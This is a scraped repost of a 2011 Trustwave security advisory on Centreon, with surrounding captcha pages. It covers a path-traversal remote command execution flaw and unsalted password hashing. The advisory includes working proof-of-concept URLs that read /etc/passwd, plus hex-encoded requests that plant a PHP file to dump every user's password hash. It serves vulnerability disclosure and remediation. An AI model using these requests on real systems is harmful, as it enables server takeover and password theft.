=== Content from cxsecurity.com_1738e14a_20250126_012343.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_ade23a61_20250126_012343.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from securityreason.com_2797cf62_20250124_135024.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **Merethis Centreon Multiple Vulnerabilities** **2011.11.13** Credit:  **[none](https://cxsecurity.com/author/none/1/)**  Risk: **Medium** Local: **No** Remote: ****Yes**** CVE: **[CVE-2011-4431](https://cxsecurity.com/cveshow/CVE-2011-4431/ "Click to see CVE-2011-4431")** | **[CVE-2011-4432](https://cxsecurity.com/cveshow/CVE-2011-4432/ "Click to see CVE-2011-4432")** CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22") [CWE-310](https://cxsecurity.com/cwe/CWE-310 "Click to see CWE-310")** | | --- | |
| --- | --- | --- | --- |

Trustwave's SpiderLabs Security Advisory TWSL2011-017:
https://www.trustwave.com/spiderlabs/advisories/TWSL2011-017.txt
Published: 2011-11-04
Version: 1.0
Vendor: Merethis (http://www.merethis.com and http://www.centreon.com)
Product: Centreon
Version affected: 2.3.1 and prior
Product description:
Centreon is network supervision and monitoring tool that is based upon
the Nagios open source monitoring engine. Centreon can be used as a
Nagios GUI and it can provide such features as real time system
monitoring, performance management and system management.
Credit: Christophe De La Fuente of Trustwave SpiderLabs
Finding 1: Remote Command Execution
Centreon supervision and monitoring tool provided by Merethis permits
remote code execution from the command help web page allowing an
attacker to execute arbitrary commands in the context of the webserver
hosting the application. Any account that has been granted the access
to "Configuration > Nagios > Checks" is able to execute commands.
The following Proof of Concept (PoC) executes the command
'cat /etc/passwd':
http://example.domain/centreon/main.php?p=60706&command\_name=/Centreon/SNMP/../../../../bin/cat%20/etc/passwd%20%23&o=h&min=1
Finding 2: One-Way Hash Without a Salt
The following code at lines 329-349 from
www/include/configuration/nconfigObject/contact/DB-Func.php
shows the insertContactInDB() function inserting the MD5 or SHA1
password hash in the database without using a salt:
$rq = "INSERT INTO `contact` ( " .
"`contact\_id` , `timeperiod\_tp\_id` , `timeperiod\_tp\_id2` ,
`contact\_name` , " . "`contact\_alias` , `contact\_autologin\_key` ,
`contact\_passwd` , `contact\_lang` , `contact\_template\_id`, " .
"`contact\_host\_notification\_options` ,
`contact\_service\_notification\_options` , " . "`contact\_email` ,
`contact\_pager` , `contact\_comment` , `contact\_oreon`,
`contact\_register`, `contact\_enable\_notifications` , " .
"`contact\_admin` , `contact\_type\_msg`, `contact\_activate`,
`contact\_auth\_type`, " . "`contact\_ldap\_dn`, `contact\_location`,
`contact\_address1`, `contact\_address2`, " . "`contact\_address3`,
`contact\_address4`, `contact\_address5`, `contact\_address6`)" .
"VALUES ( ";
$rq .= "NULL, "; isset($ret["timeperiod\_tp\_id"]) && $ret["timeperiod\_tp\_id"]
!= NULL ? $rq .= "'".$ret["timeperiod\_tp\_id"]."', ": $rq .= "NULL, ";
isset($ret["timeperiod\_tp\_id2"]) && $ret["timeperiod\_tp\_id2"] != NULL ? $rq
.= "'".$ret["timeperiod\_tp\_id2"]."', ": $rq .= "NULL, ";
isset($ret["contact\_name"]) && $ret["contact\_name"] != NULL ? $rq .=
"'".htmlentities($ret["contact\_name"], ENT\_QUOTES, "UTF-8")."', ": $rq .=
"NULL, ";---isset($ret["contact\_alias"]) && $ret["contact\_alias"] != NULL ?
$rq .= "'".htmlentities($ret["contact\_alias"], ENT\_QUOTES, "UTF-8")."', ":
$rq .= "NULL, "; isset($ret["contact\_autologin\_key"]) &&
$ret["contact\_autologin\_key"] != NULL ? $rq .=
"'".htmlentities($ret["contact\_autologin\_key"], ENT\_QUOTES)."', ": $rq .=
"NULL, "; if ($encryptType == 1)
isset($ret["contact\_passwd"]) && $ret["contact\_passwd"] != NULL ? $rq .=
"'".md5($ret["contact\_passwd"])."', ": $rq .= "NULL, ";
else if ($encryptType == 2)
isset($ret["contact\_passwd"]) && $ret["contact\_passwd"] != NULL ? $rq .=
"'".sha1($ret["contact\_passwd"])."', ": $rq .= "NULL, ";
else
isset($ret["contact\_passwd"]) && $ret["contact\_passwd"] != NULL ? $rq .=
"'".md5($ret["contact\_passwd"])."', ": $rq .= "NULL, ";
The combination of unsalted hashes and Finding 1 allows an attacker to
recover passwords for all accounts. The following example illustrates
this attack.
The following php code will dump the hashes of all users:
<?php require\_once ("/etc/centreon/centreon.conf.php"); require\_once "$classdir/centreonDB.class.php"; $p=new CentreonDB(); $r=$p->query("SELECT contact\_passwd from centreon.contact"); while ($w=&$r->fetchRow()) {echo $w["contact\_passwd"] . "<br>";} ?>
To upload and execute this code on the server, one method is to convert
the above php code to hexadecimal and use the remote code execution
method outlined in Finding 1 to create a server-side php file. The
length of the URL accepted in this case is limited, so the file must
be broken into three parts. The following requests create the php
file "test.php":
http://example.domain/centreon/main.php?p=60706&command\_name=/Centreon/SNMP/../../../../usr/bin/printf%20\\x3c\\x3f\\x70\\x68\\x70\\x20\\x72\\x65\\x71\\x75\\x69\\x72\\x65\\x5f\\x6f\\x6e\\x63\\x65\\x20\\x28\\x22\\x2f\\x65\\x74\\x63\\x2f\\x63\\x65\\x6e\\x74\\x72\\x65\\x6f\\x6e\\x2f\\x63\\x65\\x6e\\x74\\x72\\x65\\x6f\\x6e\\x2e\\x63\\x6f\\x6e\\x66\\x2e\\x70\\x68\\x70\\x22\\x29\\x3b\\x20\\x72\\x65\\x71\\x75\\x69\\x72\\x65\\x5f\\x6f\\x6e\\x63\\x65\\x20\\x22\\x24\\x63\\x6c\\x61\\x73\\x73\\x64\\x69\\x72\\x2f\\x63\\x65\\x6e\\x74%20|tee%20-a%20test.php%20%23&o=h&min=1
http://example.domain/centreon/main.php?p=60706&command\_name=/Centreon/SNMP/../../../../usr/bin/printf%20\\x72\\x65\\x6f\\x6e\\x44\\x42\\x2e\\x63\\x6c\\x61\\x73\\x73\\x2e\\x70\\x68\\x70\\x22\\x3b\\x20\\x24\\x70\\x3d\\x6e\\x65\\x77\\x20\\x43\\x65\\x6e\\x74\\x72\\x65\\x6f\\x6e\\x44\\x42\\x28\\x29\\x3b\\x20\\x24\\x72\\x3d\\x24\\x70\\x2d\\x3e\\x71\\x75\\x65\\x72\\x79\\x28\\x22\\x53\\x45\\x4c\\x45\\x43\\x54\\x20\\x63\\x6f\\x6e\\x74\\x61\\x63\\x74\\x5f\\x70\\x61\\x73\\x73\\x77\\x64\\x20\\x66\\x72\\x6f\\x6d\\x20\\x63\\x65\\x6e%20|tee%20-a%20test.php%20%23&o=h&min=1
http://example.domain/centreon/main.php?p=60706&command\_name=/Centreon/SNMP/../../../../usr/bin/printf%20\\x74\\x72\\x65\\x6f\\x6e\\x2e\\x63\\x6f\\x6e\\x74\\x61\\x63\\x74\\x22\\x29\\x3b\\x20\\x77\\x68\\x69\\x6c\\x65\\x20\\x28\\x24\\x77\\x3d\\x26\\x24\\x72\\x2d\\x3e\\x66\\x65\\x74\\x63\\x68\\x52\\x6f\\x77\\x28\\x29\\x29\\x20\\x7b\\x65\\x63\\x68\\x6f\\x20\\x24\\x77\\x5b\\x22\\x63\\x6f\\x6e\\x74\\x61\\x63\\x74\\x5f\\x70\\x61\\x73\\x73\\x77\\x64\\x22\\x5d\\x20\\x2e\\x20\\x22\\x3c\\x62\\x72\\x3e\\x22\\x3b\\x7d\\x20\\x3f\\x3e%20|tee%20-a%20test.php%20%23&o=h&min=1
Execution of http://example.domain/centreon/test.php will provide
the unsalted hashes. Using rainbow tables, these passwords can be
reversed, the time and size of rainbow table required dependent on
the complexity of the passwords involved.
Remediation Steps:
Customers should upgrade to version 2.3.2 in order to remediate these
issues.
Revision History:
10/19/11 - Vulnerability Disclosed
11/02/11 - Patch released
11/04/11 - Advisory Published
References
1. http://www.merethis.com
2. http://www.centreon.com
About Trustwave: Trustwave is the leading provider of on-demand and
subscription-based information security and payment card industry
compliance management solutions to businesses and government entities
throughout the world. For organizations faced with today's challenging
data security and compliance environment, Trustwave provides a unique
approach with comprehensive solutions that include its flagship
TrustKeeper compliance management software and other proprietary
security solutions. Trustwave has helped thousands of organizations --
ranging from Fortune 500 businesses and large financial institutions
to small and medium-sized retailers--manage compliance and secure their
network infrastructure, data communications and critical information
assets. Trustwave is headquartered in Chicago with offices throughout
North America, South America, Europe, Africa, China and Australia.
For more information, visit https://www.trustwave.com
About Trustwave's SpiderLabs: SpiderLabs(R) is the advanced security
team at Trustwave focused on application security, incident response,
penetration testing, physical security and security research. The team
has performed over a thousand incident investigations, thousands of
penetration tests and hundreds of application security tests globally.
In addition, the SpiderLabs Research team provides intelligence through
bleeding-edge research and proof of concept tool development to enhance
Trustwave's products and services.
https://www.trustwave.com/spiderlabs
Disclaimer: The information provided in this advisory is provided "as is"
without warranty of any kind. Trustwave disclaims all warranties,
either express or implied, including the warranties of merchantability
and fitness for a particular purpose. In no event shall Trustwave or
its suppliers be liable for any damages whatsoever including direct,
indirect, incidental, consequential, loss of business profits or
special damages, even if Trustwave or its suppliers have been advised
of the possibility of such damages. Some states do not allow the
exclusion or limitation of liability for consequential or incidental
damages so the foregoing limitation may not apply.

**##### References:**

 https://www.trustwave.com/spiderlabs/advisories/TWSL2011-017.txt

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2011110104)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top



=== Content from cxsecurity.com_ce56466a_20250126_012342.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_d16799a3_20250126_012342.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_050c762a_20250126_012341.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---


